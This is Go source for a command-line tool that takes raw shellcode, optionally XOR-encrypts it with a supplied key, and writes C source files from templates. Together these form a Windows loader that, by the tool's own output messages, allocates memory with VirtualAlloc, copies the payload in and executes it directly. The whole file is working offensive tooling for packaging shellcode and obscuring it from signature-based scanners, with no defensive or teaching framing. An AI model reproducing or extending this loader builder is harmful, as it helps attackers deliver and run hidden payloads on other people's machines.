package main

import (
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

var (
	shellcodePath = flag.String("b", "", "Path to shellcode .bin file")
	outputPath    = flag.String("o", "", "Output folder")
	ldrToken      = flag.String("ldr", "", "Loader token")
	enc           = flag.String("enc", "", "Encryption type (optional)")
	key           = flag.String("key", "", "Encryption key (optional)")
)

func GetAbsFilePath(folderPath, fileName string) (string, error) {
	absFolderPath, err := filepath.Abs(strings.TrimSpace(folderPath))
	if err != nil {
		return "", fmt.Errorf("failed to get absolute path: %v", err)
	}

	return filepath.Join(absFolderPath, strings.TrimSpace(fileName)), nil
}

func ReadFile(filePath string) (string, error) {
	content, err := os.ReadFile(filePath)
	if err != nil {
		return "", err
	}

	return string(content), nil
}

func ParseBinaryFile(filePath string) ([]string, error) {
	content, err := os.ReadFile(filePath)
	if err != nil {
		return nil, err
	}

	var byteArray []string
	for _, b := range content {
		byteArray = append(byteArray, fmt.Sprintf("0x%02X", b))
	}

	return byteArray, nil
}

func SaveToFile(folderPath, fileName, content string) error {
	filePath, err := GetAbsFilePath(folderPath, fileName)
	if err != nil {
		return err
	}

	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		if err := os.MkdirAll(filepath.Dir(filePath), 0o755); err != nil {
			return err
		}
	}

	return os.WriteFile(filePath, []byte(content), 0o644)
}

func ToCArray(filePath string) (string, error) {
	byteArray, err := ParseBinaryFile(filePath)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("{ %s }", strings.Join(byteArray, ", ")), nil
}

func ProcessShellcodeTemplate(shellcodePath string, args ...string) error {
	/*
		args[0] - enc type
		args[1] - key
	*/

	if len(args) > 0 {
		enc := args[0]
		key := args[1]

		switch enc {
		case "xor":
			fmt.Println("[!!!] XORing shellcode with key:", key)
			shellcode, err := os.ReadFile(shellcodePath)
			if err != nil {
				return err
			}

			/*
				sanity check
			*/

			var byteArray []string
			for _, b := range shellcode {
				byteArray = append(byteArray, fmt.Sprintf("0x%02X", b))
			}

			ba := fmt.Sprintf("{ %s }", strings.Join(byteArray, ", "))

			fmt.Println("[Sanity Check] Starting bytes (before XOR): ", ba[0:24], "... }")

			for i := 0; i < len(shellcode); i++ {
				shellcode[i] ^= key[i%len(key)]
			}

			err = os.WriteFile(shellcodePath+".enc", shellcode, 0o644)
			if err != nil {
				return err
			}

			shellcodePath = shellcodePath + ".enc"

			fmt.Printf("[*] Encrypted shellcode saved to: %s\n\n", shellcodePath)

		default:
			fmt.Println("Unknown enc type:", enc)
		}

		shellcodeArray, err := ToCArray(shellcodePath)
		if err != nil {
			return err
		}

		fileInfo, err := os.Stat(shellcodePath)
		if err != nil {
			return err
		}

		shellcode_template, err := ReadFile(filepath.Join("Template", "Source/Shellcode.c"))
		if err != nil {
			return err
		}

		shellcodeTemplate := strings.ReplaceAll(shellcode_template, "${SHELLCODE}", shellcodeArray)
		shellcodeTemplate = strings.ReplaceAll(shellcodeTemplate, "${SHELLCODE_SIZE}", fmt.Sprintf("%d", fileInfo.Size()))

		abs, err := filepath.Abs(strings.TrimSpace(*outputPath))
		if err != nil {
			return err
		}

		fmt.Println("[*] Saving generated files to:", abs)

		fmt.Println("[SHELLCODE] Shellcode size:", fileInfo.Size(), "bytes")
		fmt.Println("[SHELLCODE] Starting bytes: ", shellcodeArray[0:24], "... }")

		err = SaveToFile(*outputPath, "Shellcode.c", shellcodeTemplate)
		if err != nil {
			return err
		}

		fmt.Println("[*] Shellcode.c -> OK")

		header_template, err := ReadFile(filepath.Join("Template", "Include/Shellcode.h"))
		if err != nil {
			return err
		}
		fmt.Println("[*] Shellcode.h -> OK")

		err = SaveToFile(*outputPath, "Shellcode.h", header_template)
		if err != nil {
			return err
		}

		return nil
	}

	return nil
}

func ProcessLoaderTemplate(token string, args ...string) error {
	/*
		token : ldr (inline, xor_inline)
		args[0] - enc type
		args[1] - key
	*/

	var enc string
	var key string

	if len(args) > 0 {
		enc = args[0]
		key = args[1]
	}

	switch token {
	case "inline":
		fmt.Println("[LDR] Using: VirtualAlloc, memcpy, ((void(*)())exec)();")
		ldr, err := ReadFile(filepath.Join("Template", "Source/Function.c"))
		if err != nil {
			return err
		}

		err = SaveToFile(*outputPath, "Main.c", ldr)
		if err != nil {
			return err
		}

	case "xor_inline":
		/*
			enc type and key must be passed as args
		*/

		fmt.Println("[LDR] Using: VirtualAlloc, memcpy, ((void(*)())exec)();")
		switch enc {
		case "xor":
			fmt.Println("[LDR] Using: XOR with key:", key)
			ldr, err := ReadFile(filepath.Join("Template", "Source/XorFunction.c"))
			if err != nil {
				return err
			}

			ldr = strings.ReplaceAll(ldr, "${KEY}", key)
			err = SaveToFile(*outputPath, "Main.c", ldr)
			if err != nil {
				return err
			}

			xor, err := ReadFile(filepath.Join("Template", "Source/Xor.c"))
			if err != nil {
				return err
			}

			err = SaveToFile(*outputPath, "Xor.c", xor)
			if err != nil {
				return err
			}

			xor_h, err := ReadFile(filepath.Join("Template", "Include/Xor.h"))
			if err != nil {
				return err
			}

			err = SaveToFile(*outputPath, "Xor.h", xor_h)
			if err != nil {
				return err
			}

		default:
			fmt.Println("Unknown enc type:", enc)

		}

	default:
		fmt.Println("Unknown token:", token)
	}

	fmt.Println("[*] Main.c -> OK")
	return nil
}

func main() {
	/*
		const (
		shellcodePath = "Template/Bin/Calc.bin"
		*outputPath    = "Output"
		ldrToken      = "xor_inline"
		enc 		 = "xor"
		xorKey        = "aaaabbbbccccdddd"
		)
	*/

	flag.Parse()

	if *shellcodePath == "" || *outputPath == "" || *ldrToken == "" {
		flag.PrintDefaults()
		return
	}

	err := ProcessShellcodeTemplate(*shellcodePath, *enc, *key)
	if err != nil {
		fmt.Println("Error processing shellcode:", err)
		return
	}

	err = ProcessLoaderTemplate(*ldrToken, *enc, *key)
	if err != nil {
		fmt.Println("Error processing loader:", err)
		return
	}
}
